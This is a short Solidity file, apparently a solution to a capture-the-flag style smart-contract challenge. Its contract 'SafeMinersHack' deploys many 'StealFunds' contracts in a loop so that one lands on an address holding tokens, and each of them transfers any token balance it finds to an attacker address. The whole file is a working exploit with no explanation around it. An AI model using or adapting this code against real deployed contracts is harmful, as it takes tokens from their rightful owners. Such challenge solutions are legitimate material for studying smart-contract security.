// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract SafeMinersHack {
    constructor(address attacker, IERC20 token, uint256 nonces) {
        for (uint256 idx; idx < nonces; idx++) {
            new StealFunds(attacker, token);
        }
    }
}

contract StealFunds {
    constructor(address attacker, IERC20 token) {
        uint256 balance = token.balanceOf(address(this));
        if (balance > 0) {
            token.transfer(attacker, balance);
        }
    }
}
